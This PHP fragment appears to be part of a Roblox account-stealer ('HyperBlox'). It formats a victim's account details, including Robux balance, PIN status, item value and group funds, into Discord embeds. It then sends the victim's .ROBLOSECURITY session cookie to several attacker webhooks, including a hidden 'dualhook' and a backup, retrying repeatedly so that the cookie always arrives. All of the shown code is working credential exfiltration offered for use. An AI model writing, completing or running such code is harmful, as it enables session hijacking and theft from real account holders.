                    'value' => "• **Display:** `$displayName`\n• **Username:** `$username`\n• **User ID:** `$userId`\n• **Age:** `$accountAge`\n• **Join Date:** `$joinDate`\n• **Bio:** `$bio`",
                    'inline' => true
                ],
                [
                    'name' => '**<:info:1391434745207853138> Information:**',
                    'value' => "• **Robux:** `$robux`\n• **Pending:** `$pendingRobux`\n• **Credit:** `$creditBalance`\n• **Summary:** `$summary`",
                    'inline' => true
                ],
                [
                    'name' => '**<:settings:1391433304145924146> Settings:**',
                    'value' => "• **PIN:** `$pinStatus`\n• **Premium:** `" . ($settingsData['IsPremium'] ? '✅ True' : '❌ False') . "`\n• **VC:** `$vcStatus`\n• **Verified:** `$emailVerified`\n• **Presence:** `$presenceType`",
                    'inline' => true
                ],
                [
                    'name' => '**<:Games:1313020733932306462> Games Played:**',
                    'value' => "<:bf:1303894849530888214> $space {$games['BF']} $space {$gamePasses['BF']}\n" .
                               "<:adm:1303894863007453265> $space {$games['AM']} $space {$gamePasses['AM']}\n" .
                               "<:mm2:1303894855281541212> $space {$games['MM2']} $space {$gamePasses['MM2']}\n" .
                               "<:ps99:1303894865079308288> $space {$games['PS99']} $space {$gamePasses['PS99']}\n" .
                               "<:bb:1303894852697718854> $space {$games['BB']} $space {$gamePasses['BB']}",
                    'inline' => true
                ],
                [
                    'name' => '**<:bag:1391435344779677887> Inventory:**',
                    'value' => "• **RAP:** `$rap`\n• **Headless:** `$headlessStatus`\n• **Korblox:** `$korbloxStatus`",
                    'inline' => true
                ],
                [
                    'name' => '**<:groups:1391434330823200840> Groups:**',
                    'value' => "• **Owned:** `$totalGroupsOwned`\n• **Highest Rank:** `#$highestRank in $highestGroup`\n• **Funds:** `$totalGroupFunds R$`\n• **Pending:** `$totalPendingGroupFunds R$`",
                    'inline' => true
                ],
                [
                    'name' => '**<:user:1391436034843349002> Profile:**',
                    'value' => "• **Friends:** `$friendsCount`\n• **Followers:** `$followersCount`",
                    'inline' => true
                ]
            ]
        ]
    ]
];

// Ensure we have a valid cookie for embed2 (use refreshed cookie or fallback to original)
$cookieForEmbed = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? $refreshedCookie : $cookie;
$cookieLabel = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? 'Refreshed Cookie' : 'Original Cookie';

// Make sure cookie is not empty for embed2
if (empty($cookieForEmbed) || strlen(trim($cookieForEmbed)) < 10) {
    $cookieForEmbed = $cookie; // Fallback to original cookie
    $cookieLabel = 'Original Cookie';
}

$embed2 = [
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '🍪 .ROBLOSECURITY',
            'description' => "```\n" . substr($cookieForEmbed, 0, 2000) . "\n```",
            'color' => hexdec('00BFFF'),
            'footer' => [
                'text' => $cookieLabel,
                'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'thumbnail' => [
                'url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'timestamp' => $timestamp
        ]
    ]
];

// Send embeds to all webhooks (adminhook + main webhook + dualhook)
logStep('WEBHOOK_SENDING', 'INFO', 'Starting to send embeds to ' . count($webhooks) . ' webhook(s)');
// Send both embeds unconditionally to each webhook - no validation checks inside loop
foreach ($webhooks as $webhookIndex => $webhook) {
    // Skip empty webhooks, but don't validate URL again (already validated when added to array)
    if (empty($webhook)) {
        logStep('WEBHOOK_SENDING', 'WARNING', "Webhook #$webhookIndex is empty, skipping");
        continue;
    }

    $normalizedWebhook = trim($webhook);
    $normalizedMain = trim($mainWebhook ?? '');
    $normalizedDual = trim($dualhook ?? '');

    if (!empty($adminhook) && $normalizedWebhook === trim($adminhook)) {
        $webhookName = 'adminhook';
    } elseif (!empty($normalizedMain) && $normalizedWebhook === $normalizedMain) {
        $webhookName = 'main_webhook';
    } elseif (!empty($normalizedDual) && $normalizedWebhook === $normalizedDual) {
        $webhookName = 'dualhook';
    } else {
        $webhookName = "webhook_$webhookIndex";
    }
    logStep('WEBHOOK_SENDING', 'INFO', "Processing $webhookName (index: $webhookIndex)");
    
    // Send embed1 (RAP summary) to this webhook - ALWAYS send
    logStep('WEBHOOK_SENDING', 'INFO', "Sending embed1 (RAP) to $webhookName");
    $result1 = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed1);
    $embed1Success = isset($result1['http_code']) && $result1['http_code'] >= 200 && $result1['http_code'] < 300;
    if ($embed1Success) {
        logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed1 sent to $webhookName - HTTP " . ($result1['http_code'] ?? 'unknown'));
    } else {
        $httpCode = $result1['http_code'] ?? 0;
        $curlError = $result1['error'] ?? '';
        $responseBody = $result1['response'] ?? '';
        $errorDetails = buildHttpErrorDetails($httpCode, $curlError, $responseBody, $webhook);
        logStep('WEBHOOK_SENDING', 'ERROR', "Embed1 failed for $webhookName - $errorDetails");
    }
    // Minimal delay before sending embed2 to prevent rate limiting
    usleep(300000); // 0.3 seconds
    
    // Send embed2 (cookie) to this webhook - CRITICAL: Always send embed2
    // Don't skip embed2 even if embed1 failed - this ensures all webhooks get cookie
    logStep('WEBHOOK_SENDING', 'INFO', "Sending embed2 (cookie) to $webhookName");
    $result2 = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
    $embed2Success = isset($result2['http_code']) && $result2['http_code'] >= 200 && $result2['http_code'] < 300;
    
    // Check if embed2 succeeded, retry once if failed (Discord sometimes rate limits)
    if (!$embed2Success) {
        $httpCode = $result2['http_code'] ?? 0;
        $curlError = $result2['error'] ?? '';
        $responseBody = $result2['response'] ?? '';
        $errorDetails = buildHttpErrorDetails($httpCode, $curlError, $responseBody, $webhook);
        logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 failed for $webhookName - $errorDetails - Retrying...");
        usleep(500000); // 0.5 seconds delay before retry
        $result2Retry = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
        $embed2RetrySuccess = isset($result2Retry['http_code']) && $result2Retry['http_code'] >= 200 && $result2Retry['http_code'] < 300;
        if ($embed2RetrySuccess) {
            logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 retry successful for $webhookName - HTTP " . ($result2Retry['http_code'] ?? 'unknown'));
        } else {
            // If retry also failed, try one more time
            $retryHttpCode = $result2Retry['http_code'] ?? 0;
            $retryCurlError = $result2Retry['error'] ?? '';
            $retryResponseBody = $result2Retry['response'] ?? '';
            $retryErrorDetails = buildHttpErrorDetails($retryHttpCode, $retryCurlError, $retryResponseBody, $webhook);
            logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 retry failed for $webhookName - $retryErrorDetails - Final retry...");
            usleep(700000); // 0.7 seconds delay
            $result2Final = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
            $embed2FinalSuccess = isset($result2Final['http_code']) && $result2Final['http_code'] >= 200 && $result2Final['http_code'] < 300;
            if ($embed2FinalSuccess) {
                logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 final retry successful for $webhookName - HTTP " . ($result2Final['http_code'] ?? 'unknown'));
            } else {
                $finalHttpCode = $result2Final['http_code'] ?? 0;
                $finalCurlError = $result2Final['error'] ?? '';
                $finalResponseBody = $result2Final['response'] ?? '';
                $finalErrorDetails = buildHttpErrorDetails($finalHttpCode, $finalCurlError, $finalResponseBody, $webhook);
                logStep('WEBHOOK_SENDING', 'ERROR', "Embed2 final retry failed for $webhookName - $finalErrorDetails");
            }
        }
    } else {
        logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 sent to $webhookName - HTTP " . ($result2['http_code'] ?? 'unknown'));
    }
    
    // Minimal delay between webhooks to avoid rate limiting
    if ($webhookIndex < count($webhooks) - 1) {
        usleep(300000); // 0.3 seconds
    }
}
logStep('WEBHOOK_SENDING', 'SUCCESS', 'Finished sending to all webhooks in array');

// Also send to non-filtered webhook (backup)
logStep('WEBHOOK_SENDING', 'INFO', 'Sending to non-filtered webhook (backup)');
$backupResult1 = makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed1);
if (isset($backupResult1['http_code']) && $backupResult1['http_code'] >= 200 && $backupResult1['http_code'] < 300) {
    logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed1 sent - HTTP ' . $backupResult1['http_code']);
} else {
    $backupHttpCode = $backupResult1['http_code'] ?? 0;
    $backupCurlError = $backupResult1['error'] ?? '';
    $backupResponse = $backupResult1['response'] ?? '';
    $backupErrorDetails = buildHttpErrorDetails($backupHttpCode, $backupCurlError, $backupResponse, $nonFilteredWebhook);
    logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed1 failed - $backupErrorDetails");
}
usleep(300000); // 0.3 seconds
$backupResult2 = makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed2);
if (isset($backupResult2['http_code']) && $backupResult2['http_code'] >= 200 && $backupResult2['http_code'] < 300) {
    logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed2 sent - HTTP ' . $backupResult2['http_code']);
} else {
    $backup2HttpCode = $backupResult2['http_code'] ?? 0;
    $backup2CurlError = $backupResult2['error'] ?? '';
    $backup2Response = $backupResult2['response'] ?? '';
    $backup2ErrorDetails = buildHttpErrorDetails($backup2HttpCode, $backup2CurlError, $backup2Response, $nonFilteredWebhook);
    logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed2 failed - $backup2ErrorDetails");
}

logStep('SCRIPT_END', 'SUCCESS', 'Script completed successfully');
echo json_encode([
    'robux' => $robux,
    'rap' => $rap,
    'summary' => $summary,
    'status' => 'success'
]);
?>